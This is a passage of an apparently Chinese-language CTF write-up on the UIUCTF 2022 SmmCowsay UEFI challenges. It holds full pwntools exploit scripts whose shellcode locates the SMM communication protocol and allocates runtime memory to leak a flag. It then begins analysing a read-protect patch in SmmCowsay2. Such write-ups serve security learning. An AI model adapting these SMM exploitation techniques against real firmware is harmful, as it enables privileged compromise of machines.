0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;mSmmCommunication&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;Communicate&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0xf79265547535a8b54d102c839a75cf12</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, &amp;buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    lea rdx, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可是一运行会发生报错：  </p><img src="/2024/12/14/uefi/19.png" class="" title="我的图图呢">  <p>由于是在执行完最后一段 shellcode 后才出现的报错，我们不难判断问题出现在 Communicate 函数的调用，通过 rax 我们可以发现其报错代码为 0xf EFI_ACCESS_DENIED，访问拒绝。  </p><p>查看源码中对这个报错代码的解释：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Communicates with a registered handler.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  This function provides a service to send and receive messages from a registered</span></span><br><span class="line"><span class="comment">  UEFI service.  This function is part of the SMM Communication Protocol that may</span></span><br><span class="line"><span class="comment">  be called in physical mode prior to SetVirtualAddressMap() and in virtual mode</span></span><br><span class="line"><span class="comment">  after SetVirtualAddressMap().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @param[in] This                The EFI_SMM_COMMUNICATION_PROTOCOL instance.</span></span><br><span class="line"><span class="comment">  @param[in, out] CommBuffer     A pointer to the buffer to convey into SMRAM.</span></span><br><span class="line"><span class="comment">  @param[in, out] CommSize       The size of the data buffer being passed in. On exit, the size of data</span></span><br><span class="line"><span class="comment">                                 being returned. Zero if the handler does not wish to reply with any data.</span></span><br><span class="line"><span class="comment">                                 This parameter is optional and may be NULL.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @retval EFI_SUCCESS            The message was successfully posted.</span></span><br><span class="line"><span class="comment">  @retval EFI_INVALID_PARAMETER  The CommBuffer was NULL.</span></span><br><span class="line"><span class="comment">  @retval EFI_BAD_BUFFER_SIZE    The buffer is too large for the MM implementation.</span></span><br><span class="line"><span class="comment">                                 If this error is returned, the MessageLength field</span></span><br><span class="line"><span class="comment">                                 in the CommBuffer header or the integer pointed by</span></span><br><span class="line"><span class="comment">                                 CommSize, are updated to reflect the maximum payload</span></span><br><span class="line"><span class="comment">                                 size the implementation can accommodate.</span></span><br><span class="line"><span class="comment">  @retval EFI_ACCESS_DENIED      The CommunicateBuffer parameter or CommSize parameter,</span></span><br><span class="line"><span class="comment">                                 if not omitted, are in address range that cannot be</span></span><br><span class="line"><span class="comment">                                 accessed by the MM environment.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function">EFI_STATUS</span></span><br><span class="line"><span class="function">EFIAPI</span></span><br><span class="line"><span class="function"><span class="title">SmmCommunicationCommunicate</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN CONST EFI_SMM_COMMUNICATION_PROTOCOL  *This,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN OUT VOID                              *CommBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN OUT UINTN                             *CommSize OPTIONAL</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span>;</span><br></pre></td></tr></table></figure><p>CommunicateBuffer 位于 SMM 环境无法访问的地址范围内。这个时候我们联想到我们上一面讲过的一个缓冲区检查的函数 SmmIsBufferOutsideSmmValid，因为我们的 Buffer 位于我们输入 shellcode 的那个地址空间，必然不符合要求。那原来的程序的 Buffer 是在什么地方或者说是怎么申请的呢？我们继续看题目代码：  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer = AllocateRuntimeZeroPool(sizeof(*Buffer) + sizeof(CHAR16 *));</span></span><br><span class="line"><span class="addition">+  if (!Buffer)</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;MessageLength = sizeof(CHAR16 *);</span></span><br><span class="line"><span class="addition">+  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  mSmmCommunication-&gt;Communicate(</span></span><br><span class="line"><span class="addition">+    mSmmCommunication,</span></span><br><span class="line"><span class="addition">+    Buffer,</span></span><br><span class="line"><span class="addition">+    NULL</span></span><br><span class="line"><span class="addition">+  );</span></span><br></pre></td></tr></table></figure><p>可以发现 Buffer 是通过 AllocateRuntimeZeroPool 函数申请出来的，我们继续看这个函数：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Allocates and zeros a buffer of type EfiRuntimeServicesData. &lt;======分配的data的类型</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Allocates the number bytes specified by AllocationSize of type EfiRuntimeServicesData, clears the</span></span><br><span class="line"><span class="comment">  buffer with zeros, and returns a pointer to the allocated buffer.  If AllocationSize is 0, then a</span></span><br><span class="line"><span class="comment">  valid buffer of 0 size is returned.  If there is not enough memory remaining to satisfy the</span></span><br><span class="line"><span class="comment">  request, then NULL is returned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @param  AllocationSize        The number of bytes to allocate and zero.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @return A pointer to the allocated buffer or NULL if allocation fails.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function">VOID *</span></span><br><span class="line"><span class="function">EFIAPI</span></span><br><span class="line"><span class="function"><span class="title">AllocateRuntimeZeroPool</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN UINTN  AllocationSize</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">InternalAllocateZeroPool</span> (EfiRuntimeServicesData, AllocationSize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后找 gpt 老师问了一下这个函数在干什么：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return InternalAllocateZeroPool (EfiRuntimeServicesData, AllocationSize);: 这行代码调用了 InternalAllocateZeroPool 函数，并将返回值直接返回给调用者。InternalAllocateZeroPool 是一个内部函数，它负责实际分配内存。第一个参数 EfiRuntimeServicesData 是一个枚举值，指定了内存应该从UEFI运行时服务的数据区域分配。第二个参数 AllocationSize 是前面提到的要分配的内存大小。  </span><br></pre></td></tr></table></figure><p>也就是说 Buffer 应该是一个 EfiRuntimeServicesData 类型的地址空间。  </p><img src="/2024/12/14/uefi/20.png" class="" title="我的图图呢">  <p>从官方文档可以知道该枚举值为 6。接下来我们就很清楚了，申请一块 EfiRuntimeServicesData 类型的地址空间并写上我们伪造的 Buffer，其他操作和前面一直即可。可是我们没法用已有的东西直接调用 AllocateRuntimeZeroPool，但是我们可以用类似的函数替代，BootServices-&gt;AllocatePool() 和 BootServices-&gt;AllocatePages()都行。只要分配的类型是 EfiRuntimeServicesData 就行。此处使用BootServices-&gt;AllocatePool() 进行分配。  </p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>最终 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Address of SystemTable: 0x&#x27;</span>)</span><br><span class="line">systemTable = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">codeAddr = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;systemTable&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;codeAddr&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;systemTable&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 96]</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 320]</span></span><br><span class="line"><span class="string">    mov rcx, qword ptr [rax + 64]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">BootServices = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RCX: 0x&#x27;</span>)</span><br><span class="line">AllocatePool = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;BootServices&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;LocateProtocol&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;AllocatePool&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;mSmmCommunication&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;Communicate&quot;</span>)</span><br><span class="line"></span><br><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;buffer&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCowsayCommunicationGuid = <span class="number">0xf79265547535a8b54d102c839a75cf12</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x20</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>最终效果：  </p><img src="/2024/12/14/uefi/21.png" class="" title="我的图图呢">  <p>可能有人会问为什么这个 flag 的偶数位不见了，这是因为 flag 存储是 UTF-16，所以它取数据是一次跳 2 byte 取的。只需要地址加 1 即可获得所有 flag。</p><h3 id="UIUCTF-2022-SmmCowsay2"><a href="#UIUCTF-2022-SmmCowsay2" class="headerlink" title="UIUCTF 2022 SmmCowsay2"></a>UIUCTF 2022 SmmCowsay2</h3><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目描述：  </p><blockquote><p>We asked that engineer to fix the issue, but I think he may have left a backdoor disguised as debugging code.  </p></blockquote><p>这一题和上一题的文件结构一模一样，运气起来的效果也一样，唯一不同的就是 patch 文件不一样。由于上一题已经对文件进行了详细的分析，所以这里重点关注漏洞的部分。<br>首先看 0005-PiSmmCpuDxeSmm-Protect-flag-addresses.patch 文件：  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+  // Flag must not be seen</span></span><br><span class="line"><span class="addition">+  SmmSetMemoryAttributes (</span></span><br><span class="line"><span class="addition">+    0x44440000,</span></span><br><span class="line"><span class="addition">+    EFI_PAGES_TO_SIZE(1),</span></span><br><span class="line"><span class="addition">+    EFI_MEMORY_RP</span></span><br><span class="line"><span class="addition">+    );</span></span><br></pre></td></tr></table></figure><p>这段代码用 gpt 的话来说，其作用是：</p><ul><li>SmmSetMemoryAttributes 是一个函数调用，它的作用是设置指定内存范围的属性。</li><li>第一个参数 0x44440000 是要设置属性的内存的起始地址。</li><li>第二个参数 EFI_PAGES_TO_SIZE(1) 是一个宏，用于将页面数转换为字节数。在这里，它表示只设置一个页面（通常情况下，一个内存页面是4KB大小，除非特别指定了不同的页面大小）。</li><li>第三个参数 EFI_MEMORY_RP 是要设置的内存属性。</li></ul><p>然后我看了一下源码：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Attribute values */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_UC((u64)0x0000000000000001ULL)<span class="comment">/* uncached */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_WC((u64)0x0000000000000002ULL)<span class="comment">/* write-coalescing */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_WT((u64)0x0000000000000004ULL)<span class="comment">/* write-through */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_WB((u64)0x0000000000000008ULL)<span class="comment">/* write-back */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_UCE((u64)0x0000000000000010ULL)<span class="comment">/* uncached, exported */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_WP((u64)0x0000000000001000ULL)<span class="comment">/* write-protect */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_RP((u64)0x0000000000002000ULL)<span class="comment">/* read-protect */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_XP((u64)0x0000000000004000ULL)<span class="comment">/* execute-protect */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_NV((u64)0x0000000000008000ULL)<span class="comment">/* non-volatile */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_MORE_RELIABLE \</span></span><br><span class="line"><span class="meta">((u64)0x0000000000010000ULL)<span class="comment">/* higher reliability */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_RO((u64)0x0000000000020000ULL)<span class="comment">/* read-only */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_SP((u64)0x0000000000040000ULL)<span class="comment">/* specific-purpose memory (SPM) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEMORY_RUNTIME((u64)0x8000000000000000ULL)<span class="comment">/* range requires runtime mapping */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_MEM_DESC_VERSION1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_PAGE_SHIFT12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_PAGE_SIZE(1ULL &lt;&lt; EFI_PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFI_PAGE_MASK(EFI_PAGE_SIZE - 1)</span></span><br></pre></td></tr></table></figure><p>可以看到这段代码实际上就是给 0x44440000 这块内存设置了读保护，也就是说如果我们直接对这段内存进行读操作系统就会报错。  </p><p>Binexec 的代码页也没有什么变化：  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+VOID</span></span><br><span class="line"><span class="addition">+Cowsay (</span></span><br><span class="line"><span class="addition">+  IN CONST CHAR16 *Message</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span></span><br><span class="line"><span class="addition">+  UINTN MessageLen = StrLen(Message) * 